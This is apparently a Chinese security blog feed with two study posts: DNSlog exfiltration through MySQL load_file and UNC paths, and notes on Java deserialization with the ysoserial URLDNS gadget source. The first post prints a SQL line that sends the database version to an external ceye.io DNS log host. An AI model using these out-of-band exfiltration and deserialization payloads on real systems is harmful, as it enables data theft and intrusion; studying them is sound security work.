<h2 id="DNSlog利用原理"><a href="#DNSlog利用原理" class="headerlink" title="DNSlog利用原理"></a>DNSlog利用原理</h2><p>一个域名如果需要解析为ip。需要从最上层的顶级域名如<code>.com</code>  <code>.cn</code>，一级一级往下查询最后到达最底层的DNS服务器，返回对应目标的ip。如果我们拥有一个DNS服务器那么如果有客户端访问对应的域名我们就可以获得对应的日志。</p>
<span id="more"></span>
<p>通过这点我们可以方便的判断我们的XSS , SSRF漏洞是否可以被客户端访问。同时通过 <code>ping</code>命令我们也可以方便的判断RCE是否成功执行。这些都是帮助我们判断漏洞是否利用成功。但是DNSlog注入可以帮助我们获得信息。</p>
<h2 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h2><h3 id="UNC路径和load-file"><a href="#UNC路径和load-file" class="headerlink" title="UNC路径和load_file"></a>UNC路径和load_file</h3><p>在<code>windows</code>上类似与<code>\\servername\sharename</code>表示访问的是远程网洛上的资源。<br>在mysql数据库中<code>load_file</code>是一个读取文件的函数。它的权限在<code>my.ini</code>中设置<code>secure_file_priv</code>选项:<br><code>secure_file_priv = null</code>表示不允许读取文件<br><code>secure_file_priv = D:\</code> 允许读取D盘上的文件<br><code>secure_file_priv = &quot;&quot;</code>或 <code>secure_file_priv = </code>表示可以任意读取文件。<br>如果在sql注入的过程中可以使用<code>load_file</code>函数读取任意文件，那我们可以配合使用 <code>UNC</code>读取远程文件。在文件路径中拼接对应的信息达到利用漏洞的效果。</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>在在线DNSlog平台<a href="http://ceye.io/">http://ceye.io</a>  注册帐号后，会在个人资料免费给我们一个域名，如果有对该域名的解析记录我们都可以在平台上查看。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220304171441.png">  <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220304171525.png"><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220304171607.png"></p>
<p>我们在mysql 控制台中输入语句:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file( concat(&#x27;\\\\&#x27;, (select version()), &#x27;.test.h2t5ky.ceye.io\\abc&#x27; ));</span><br></pre></td></tr></table></figure>
<p>可以发现在平台上已经获得了对应的mysql版本。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220304171754.png"><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220304171817.png"><br>需要注意的是load_fiel中域名后面必须加上对应的文件，才会有DNS解析记录。这条命名就不会产在平台产生记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file( concat(&#x27;\\\\&#x27;, (select version()), &#x27;.testfilename.h2t5ky.ceye.io&#x27; ));</span><br></pre></td></tr></table></figure>




]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title>java漫谈笔记-反序列化篇-1</title>
    <url>/2022/03/05/java%E6%BC%AB%E8%B0%88%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-1/</url>
    <content><![CDATA[<h1 id="JAVA安全漫谈-反序列化篇-笔记"><a href="#JAVA安全漫谈-反序列化篇-笔记" class="headerlink" title="JAVA安全漫谈-反序列化篇 笔记"></a>JAVA安全漫谈-反序列化篇 笔记</h1><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>文章为phith0n<a href="https://govuln.com/">【代码审计】知识星球</a>中JAVA安全漫谈部分部分内容摘抄与阅读笔记。</p>
<h3 id="JAVA-反序列化"><a href="#JAVA-反序列化" class="headerlink" title="JAVA 反序列化"></a>JAVA 反序列化</h3><p>Java在序列化时一个对象，将会调用这个对象中的 writeObject 方法，参数类型是<br>ObjectOutputStream ，开发者可以将任何内容写入这个stream中；反序列化时，会调用<br>readObject ，开发者也可以从中读取出前面写入的内容，并进行处理。</p>
<span id="more"></span>

<p>我们编写一个Person类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Person.java</span></span><br><span class="line"><span class="keyword">package</span> seria;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span>  <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    Person(String name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span><span class="keyword">throws</span>  IOException</span>&#123;</span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line">        s.writeObject(<span class="string">&quot;this is a object&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span>  <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException , ClassNotFoundException </span>&#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        String mes = (String) s.readObject();</span><br><span class="line">        System.out.println(mes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Main.java</span></span><br><span class="line"><span class="keyword">package</span> seria;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span></span>&#123;</span><br><span class="line">        Person x = <span class="keyword">new</span> Person(<span class="string">&quot;Li&quot;</span> , <span class="number">12</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;object.txt&quot;</span>));</span><br><span class="line">            oos.writeObject(x);</span><br><span class="line"></span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;object.txt&quot;</span>));</span><br><span class="line">            Person y = (Person) ois.readObject();</span><br><span class="line">            System.out.printf(<span class="string">&quot;name = %s , age = %d\n&quot;</span>, y.name, y.age);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在对对象进行反序列化的时候，系统输出了我们输入的字符串。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220305143326.png"><br>如果我们使用之前的反序列查看工具<code>SerializationDumper</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 12 - 0x00 0c</span><br><span class="line">        Value - seria.Person - 0x73657269612e506572736f6e</span><br><span class="line">      serialVersionUID - 0x58 09 df 79 a0 71 f3 f0</span><br><span class="line">      newHandle 0x00 7e 00 00</span><br><span class="line">      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE</span><br><span class="line">      fieldCount - 2 - 0x00 02</span><br><span class="line">      Fields</span><br><span class="line">        0:</span><br><span class="line">          Int - I - 0x49</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 3 - 0x00 03</span><br><span class="line">            Value - age - 0x616765</span><br><span class="line">        1:</span><br><span class="line">          Object - L - 0x4c</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 4 - 0x00 04</span><br><span class="line">            Value - name - 0x6e616d65</span><br><span class="line">          className1</span><br><span class="line">            TC_STRING - 0x74</span><br><span class="line">              newHandle 0x00 7e 00 01</span><br><span class="line">              Length - 18 - 0x00 12</span><br><span class="line">              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b</span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - 0x78</span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - 0x70</span><br><span class="line">    newHandle 0x00 7e 00 02</span><br><span class="line">    classdata</span><br><span class="line">      seria.Person</span><br><span class="line">        values</span><br><span class="line">          age</span><br><span class="line">            (int)12 - 0x00 00 00 0c</span><br><span class="line">          name</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - 0x74</span><br><span class="line">                newHandle 0x00 7e 00 03</span><br><span class="line">                Length - 2 - 0x00 02</span><br><span class="line">                Value - Li - 0x4c69</span><br><span class="line">        objectAnnotation</span><br><span class="line">          TC_STRING - 0x74</span><br><span class="line">            newHandle 0x00 7e 00 04</span><br><span class="line">            Length - 16 - 0x00 10</span><br><span class="line">            Value - this is a object - 0x746869732069732061206f626a656374</span><br><span class="line">          TC_ENDBLOCKDATA - 0x78</span><br><span class="line">  Invalid content element type 0xef</span><br><span class="line">Exception in thread &quot;main&quot; java.lang.RuntimeException: Error: Illegal content element type.</span><br><span class="line">        at nb.deser.SerializationDumper.readContentElement(SerializationDumper.java:410)</span><br><span class="line">        at nb.deser.SerializationDumper.parseStream(SerializationDumper.java:331)</span><br><span class="line">        at nb.deser.SerializationDumper.main(SerializationDumper.java:113)</span><br><span class="line"></span><br><span class="line">C:\Users\Home\Desktop\javaUnserialize\static\SerializationDumper-master&gt;java -jar SerializationDumper.jar &quot;ACED00057372000C73657269612E506572736F6E5809DF79A071F3F00300024900036167654C00046E616D657400124C6A6176612F6C616E672F537472696E673B78700000000C7400024C69740010746869732069732061206F626A65637478&quot;</span><br><span class="line"></span><br><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 12 - 0x00 0c</span><br><span class="line">        Value - seria.Person - 0x73657269612e506572736f6e</span><br><span class="line">      serialVersionUID - 0x58 09 df 79 a0 71 f3 f0</span><br><span class="line">      newHandle 0x00 7e 00 00</span><br><span class="line">      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE</span><br><span class="line">      fieldCount - 2 - 0x00 02</span><br><span class="line">      Fields</span><br><span class="line">        0:</span><br><span class="line">          Int - I - 0x49</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 3 - 0x00 03</span><br><span class="line">            Value - age - 0x616765</span><br><span class="line">        1:</span><br><span class="line">          Object - L - 0x4c</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 4 - 0x00 04</span><br><span class="line">            Value - name - 0x6e616d65</span><br><span class="line">          className1</span><br><span class="line">            TC_STRING - 0x74</span><br><span class="line">              newHandle 0x00 7e 00 01</span><br><span class="line">              Length - 18 - 0x00 12</span><br><span class="line">              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b</span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - 0x78</span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - 0x70</span><br><span class="line">    newHandle 0x00 7e 00 02</span><br><span class="line">    classdata</span><br><span class="line">      seria.Person</span><br><span class="line">        values</span><br><span class="line">          age</span><br><span class="line">            (int)12 - 0x00 00 00 0c</span><br><span class="line">          name</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - 0x74</span><br><span class="line">                newHandle 0x00 7e 00 03</span><br><span class="line">                Length - 2 - 0x00 02</span><br><span class="line">                Value - Li - 0x4c69</span><br><span class="line">        objectAnnotation</span><br><span class="line">          TC_STRING - 0x74</span><br><span class="line">            newHandle 0x00 7e 00 04</span><br><span class="line">            Length - 16 - 0x00 10</span><br><span class="line">            Value - this is a object - 0x746869732069732061206f626a656374</span><br><span class="line">          TC_ENDBLOCKDATA - 0x78</span><br><span class="line"></span><br><span class="line">C:\Users\Home\Desktop\javaUnserialize\static\SerializationDumper-master&gt;java -jar SerializationDumper.jar -f 1.txt</span><br><span class="line"></span><br><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 12 - 0x00 0c</span><br><span class="line">        Value - seria.Person - 0x73657269612e506572736f6e</span><br><span class="line">      serialVersionUID - 0x58 09 df 79 a0 71 f3 f0</span><br><span class="line">      newHandle 0x00 7e 00 00</span><br><span class="line">      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE</span><br><span class="line">      fieldCount - 2 - 0x00 02</span><br><span class="line">      Fields</span><br><span class="line">        0:</span><br><span class="line">          Int - I - 0x49</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 3 - 0x00 03</span><br><span class="line">            Value - age - 0x616765</span><br><span class="line">        1:</span><br><span class="line">          Object - L - 0x4c</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 4 - 0x00 04</span><br><span class="line">            Value - name - 0x6e616d65</span><br><span class="line">          className1</span><br><span class="line">            TC_STRING - 0x74</span><br><span class="line">              newHandle 0x00 7e 00 01</span><br><span class="line">              Length - 18 - 0x00 12</span><br><span class="line">              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b</span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - 0x78</span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - 0x70</span><br><span class="line">    newHandle 0x00 7e 00 02</span><br><span class="line">    classdata</span><br><span class="line">      seria.Person</span><br><span class="line">        values</span><br><span class="line">          age</span><br><span class="line">            (int)12 - 0x00 00 00 0c</span><br><span class="line">          name</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - 0x74</span><br><span class="line">                newHandle 0x00 7e 00 03</span><br><span class="line">                Length - 2 - 0x00 02</span><br><span class="line">                Value - Li - 0x4c69</span><br><span class="line">        objectAnnotation</span><br><span class="line">          TC_STRING - 0x74</span><br><span class="line">            newHandle 0x00 7e 00 04</span><br><span class="line">            Length - 16 - 0x00 10</span><br><span class="line">            Value - this is a object - 0x746869732069732061206f626a656374</span><br><span class="line">          TC_ENDBLOCKDATA - 0x78</span><br><span class="line">  Invalid content element type 0xef</span><br><span class="line">Exception in thread &quot;main&quot; java.lang.RuntimeException: Error: Illegal content element type.</span><br><span class="line">        at nb.deser.SerializationDumper.readContentElement(SerializationDumper.java:410)</span><br><span class="line">        at nb.deser.SerializationDumper.parseStream(SerializationDumper.java:331)</span><br><span class="line">        at nb.deser.SerializationDumper.main(SerializationDumper.java:113)</span><br><span class="line"></span><br><span class="line">C:\Users\Home\Desktop\javaUnserialize\static\SerializationDumper-master&gt;java -jar SerializationDumper.jar &quot;ACED00057372000C73657269612E506572736F6E5809DF79A071F3F00300024900036167654C00046E616D657400124C6A6176612F6C616E672F537472696E673B78700000000C7400024C69740010746869732069732061206F626A65637478&quot;</span><br><span class="line"></span><br><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 12 - 0x00 0c</span><br><span class="line">        Value - seria.Person - 0x73657269612e506572736f6e</span><br><span class="line">      serialVersionUID - 0x58 09 df 79 a0 71 f3 f0</span><br><span class="line">      newHandle 0x00 7e 00 00</span><br><span class="line">      classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE</span><br><span class="line">      fieldCount - 2 - 0x00 02</span><br><span class="line">      Fields</span><br><span class="line">        0:</span><br><span class="line">          Int - I - 0x49</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 3 - 0x00 03</span><br><span class="line">            Value - age - 0x616765</span><br><span class="line">        1:</span><br><span class="line">          Object - L - 0x4c</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 4 - 0x00 04</span><br><span class="line">            Value - name - 0x6e616d65</span><br><span class="line">          className1</span><br><span class="line">            TC_STRING - 0x74</span><br><span class="line">              newHandle 0x00 7e 00 01</span><br><span class="line">              Length - 18 - 0x00 12</span><br><span class="line">              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b</span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - 0x78</span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - 0x70</span><br><span class="line">    newHandle 0x00 7e 00 02</span><br><span class="line">    classdata</span><br><span class="line">      seria.Person</span><br><span class="line">        values</span><br><span class="line">          age</span><br><span class="line">            (int)12 - 0x00 00 00 0c</span><br><span class="line">          name</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - 0x74</span><br><span class="line">                newHandle 0x00 7e 00 03</span><br><span class="line">                Length - 2 - 0x00 02</span><br><span class="line">                Value - Li - 0x4c69</span><br><span class="line">        objectAnnotation</span><br><span class="line">          TC_STRING - 0x74</span><br><span class="line">            newHandle 0x00 7e 00 04</span><br><span class="line">            Length - 16 - 0x00 10</span><br><span class="line">            Value - this is a object - 0x746869732069732061206f626a656374</span><br><span class="line">          TC_ENDBLOCKDATA - 0x78</span><br></pre></td></tr></table></figure>
<p>在最后的<code>objectAnnotation</code>中有我们输入的字符串。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220305143607.png">  </p>
<h3 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h3><p><code>ysoserial</code>是一个反序列化利用工具。它可以生成对应的反序列化利用链。</p>
<h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p><code>URLDNS</code>是一个反序列化利用链的名称。我们可以使用它进行一次DNS请求。我们可以使用这条链进行一次DNS请求。我们可以通过免费的DNS平台来判断是否利用成功。<a href="http://ceye.io/profile">http://ceye.io/profile</a>   </p>
<p><code>URLDNS</code>利用链的生成代码<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a>  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class="line"><span class="comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   This was inspired by  Philippe Arteau <span class="doctag">@h</span>3xstream, who wrote a blog</span></span><br><span class="line"><span class="comment"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class="line"><span class="comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class="line"><span class="comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class="line"><span class="comment"> *   standard JDK classes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>通过<code>getObject</code>方法获得一个<code>HashMap</code>类，这个类就是我们需要使用的序列化，和反序列化的恶意类类。</p>
<p>在<code>getObject</code>类中，根据注释<code>HashMap</code>唯一有效的就是作为<code>key</code>的<code>URL</code>类u。和设置u的<code>hashcode=-1</code></p>
<p>我们进入<code>HashMap</code>的<code>readObject</code>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                K key = 